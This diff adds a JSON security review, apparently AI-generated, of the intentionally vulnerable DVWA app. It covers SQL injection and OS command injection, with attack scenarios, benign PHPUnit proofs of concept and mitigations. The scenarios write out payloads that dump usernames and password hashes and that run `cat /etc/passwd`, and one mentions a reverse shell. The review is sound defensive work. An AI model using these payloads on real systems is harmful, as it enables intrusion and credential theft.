@@ -1,0 +1,129 @@
+{
+  "cwe_code_review": {
+    "project_name": "Damn Vulnerable Web Application (DVWA)",
+    "created_by": "Claude Opus 4.6 (GitHub Copilot)",
+    "created_on": "2026-05-31",
+    "created_with": "CWE Code Review v1.3"
+  },
+  "weakness_details": [
+    {
+      "id": "WEAKNESS-1",
+      "name": "SQL Injection in `/vulnerabilities/sqli/`",
+      "severity": "Critical",
+      "cvss": "8.7 CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+      "likelihood": "Very Likely",
+      "summary": "User-controlled `id` parameter in `vulnerabilities/sqli/source/low.php` allows SQL injection due to direct string interpolation in SQL queries without prepared statements, resulting in full database compromise including credential extraction and data manipulation.",
+      "attack_scenario": [
+        "1. Attacker authenticates to DVWA with any valid user account.",
+        "2. Attacker navigates to `/vulnerabilities/sqli/` and submits a crafted payload such as `1' UNION SELECT user, password FROM users-- -` in the `id` parameter.",
+        "3. The value of `$_REQUEST['id']` is assigned to `$id` in `vulnerabilities/sqli/source/low.php` without any input validation.",
+        "4. The application interpolates the payload directly into the SQL query `SELECT first_name, last_name FROM users WHERE user_id = '$id'`.",
+        "5. The database engine executes the injected UNION SELECT statement alongside the original query.",
+        "6. The application returns all usernames and MD5 password hashes from the `users` table in the HTTP response.",
+        "7. Attacker cracks the MD5 hashes offline using rainbow tables to obtain plaintext credentials for all accounts."
+      ],
+      "existing_controls": [
+        "Authentication required to access vulnerability modules.",
+        "At `medium` level, `mysqli_real_escape_string()` is applied to input.",
+        "At `impossible` level, PDO prepared statements with bound parameters are used."
+      ],
+      "residual_severity": "Critical",
+      "mitigations": [
+        "Use parameterized queries (prepared statements) with bound parameters for all database interactions.",
+        "Implement least-privilege database accounts that cannot access `information_schema` or perform administrative operations.",
+        "Deploy a Web Application Firewall (WAF) with SQL injection detection rules.",
+        "Remove verbose database error messages from HTTP responses."
+      ],
+      "capec": [
+        "CAPEC-66",
+        "CAPEC-7"
+      ],
+      "cwe": [
+        "CWE-89"
+      ],
+      "owasp": [
+        "A03:2021 - Injection"
+      ],
+      "cve": [
+        "N/A"
+      ],
+      "confidence": "Highest",
+      "locations": [
+        "vulnerabilities/sqli/source/low.php:11",
+        "vulnerabilities/sqli_blind/source/low.php:13",
+        "login.php:40"
+      ],
+      "evidence": ["```php\n// vulnerabilities/sqli/source/low.php\n$id = $_REQUEST[ 'id' ]; // SOURCE: Unsanitized attacker-controlled input.\n// ...\n$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; // PROPAGATOR: Input interpolated into a SQL query.\n$result = mysqli_query( $GLOBALS[\"___mysqli_ston\"], $query ); // SINK: Tainted SQL query executed.\n```"],
+      "unit_test": "```php\nuse GuzzleHttp\\Client;\nuse PHPUnit\\Framework\\Attributes\\Test;\nuse PHPUnit\\Framework\\TestCase;\n\nfinal class PoCs extends TestCase\n{\n    // NOTE: Harmless PoC returning a hardcoded string.\n    #[Test]\n    public function sqlInjection(): void\n    {\n        $http = new Client(['base_uri' => 'http://localhost', 'cookies' => true, 'http_errors' => false]);\n        $token = fn(string $path) => preg_match(\"/name='user_token' value='(.+?)'/\", (string) $http->get($path)->getBody(), $matches) ? $matches[1] : '';\n        $http->post('login.php', ['form_params' => [\n            'user_token' => $token('login.php'),\n            'username' => 'admin',\n            'password' => 'password'\n        ]]);\n        $http->post('security.php', ['form_params' => [\n            'user_token' => $token('security.php'),\n            'security' => 'low'\n        ]]);\n        $response = $http->post('vulnerabilities/sqli/', ['form_params' => [\n            'id' => \"1' UNION SELECT 'SQL Injection PoC', NULL-- -\" // SOURCE: Parameter containing a SQL injection payload.\n        ]]);\n        $this->assertMatchesRegularExpression('/SQL Injection PoC/', (string) $response->getBody()); // SINK: Tainted SQL query output returned in response body.\n    }\n}\n```"
+    },
+    {
+      "id": "WEAKNESS-2",
+      "name": "OS Command Injection in `/vulnerabilities/exec/`",
+      "severity": "Critical",
+      "cvss": "8.7 CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+      "likelihood": "Very Likely",
+      "summary": "User-controlled `ip` parameter in `vulnerabilities/exec/source/low.php` allows OS command injection due to direct string concatenation into `shell_exec()` without input validation, resulting in arbitrary command execution on the underlying server.",
+      "attack_scenario": [
+        "1. Attacker authenticates to DVWA with any valid user account.",
+        "2. Attacker navigates to `/vulnerabilities/exec/` and submits a crafted payload such as `127.0.0.1; cat /etc/passwd` in the `ip` parameter.",
+        "3. The value of `$_REQUEST['ip']` is assigned to `$target` in `vulnerabilities/exec/source/low.php` without any input validation.",
+        "4. The application concatenates the payload directly into the `shell_exec('ping -c 4 ' . $target)` call.",
+        "5. The operating system interprets the semicolon as a command separator and executes `cat /etc/passwd` after the ping command.",
+        "6. The output of both commands is returned in the HTTP response.",
+        "7. Attacker executes reverse shell command to obtain persistent interactive access to the server."
+      ],
+      "existing_controls": [
+        "Authentication required to access vulnerability modules.",
+        "At `medium` level, `&&` and `;` characters are removed from input.",
+        "At `impossible` level, strict IP address validation using numeric checks is enforced."
+      ],
+      "residual_severity": "Critical",
+      "mitigations": [
+        "Replace `shell_exec()` with language-native libraries for network operations (e.g., PHP `socket` functions).",
+        "Apply `escapeshellarg()` or `escapeshellcmd()` to all user-supplied values passed to system commands.",
+        "Implement strict allowlist input validation accepting only valid IPv4/IPv6 addresses.",
+        "Apply principle of least privilege to the web server process user.",
+        "Deploy a Web Application Firewall (WAF) with OS command injection detection rules."
+      ],
+      "capec": [
+        "CAPEC-88"
+      ],
+      "cwe": [
+        "CWE-78"
+      ],
+      "owasp": [
+        "A03:2021 - Injection"
+      ],
+      "cve": [
+        "N/A"
+      ],
+      "confidence": "Highest",
+      "locations": [
+        "vulnerabilities/exec/source/low.php:10",
+        "vulnerabilities/exec/source/low.php:14"
+      ],
+      "evidence": ["```php\n// vulnerabilities/exec/source/low.php\n$target = $_REQUEST[ 'ip' ]; // SOURCE: Unsanitized attacker-controlled input.\n// ...\nif( stristr( php_uname( 's' ), 'Windows NT' ) ) {\n    $cmd = shell_exec( 'ping ' . $target ); // SINK: Input concatenated into an OS command; tainted OS command executed.\n}\nelse {\n    $cmd = shell_exec( 'ping -c 4 ' . $target ); // SINK: Input concatenated into an OS command; tainted OS command executed.\n}\n```"],
+      "unit_test": "```php\nuse GuzzleHttp\\Client;\nuse PHPUnit\\Framework\\Attributes\\Test;\nuse PHPUnit\\Framework\\TestCase;\n\nfinal class PoCs extends TestCase\n{\n    // NOTE: Harmless PoC echoing a hardcoded string.\n    #[Test]\n    public function osCommandInjection(): void\n    {\n        $http = new Client(['base_uri' => 'http://localhost', 'cookies' => true, 'http_errors' => false]);\n        $token = fn(string $path) => preg_match(\"/name='user_token' value='(.+?)'/\", (string) $http->get($path)->getBody(), $matches) ? $matches[1] : '';\n        $http->post('login.php', ['form_params' => [\n            'user_token' => $token('login.php'),\n            'username' => 'admin',\n            'password' => 'password'\n        ]]);\n        $http->post('security.php', ['form_params' => [\n            'user_token' => $token('security.php'),\n            'security' => 'low'\n        ]]);\n        $response = $http->post('vulnerabilities/exec/', ['form_params' => [\n            'ip' => \"127.0.0.1; echo 'OS Command Injection PoC'\" // SOURCE: Parameter containing an OS command injection payload.\n        ]]);\n        $this->assertMatchesRegularExpression('/OS Command Injection PoC/', (string) $response->getBody()); // SINK: Tainted OS command output returned in response body.\n    }\n}\n```"
+    }
+  ],
+  "weakness_summary": [
+    {
+      "id": "WEAKNESS-1",
+      "severity": "Critical",
+      "cvss": "8.7",
+      "likelihood": "Very Likely",
+      "residual_severity": "Critical",
+      "confidence": "Highest",
+      "name": "SQL Injection in `/vulnerabilities/sqli/`"
+    },
+    {
+      "id": "WEAKNESS-2",
+      "severity": "Critical",
+      "cvss": "8.7",
+      "likelihood": "Very Likely",
+      "residual_severity": "Critical",
+      "confidence": "Highest",
+      "name": "OS Command Injection in `/vulnerabilities/exec/`"
+    }
+  ]
+}
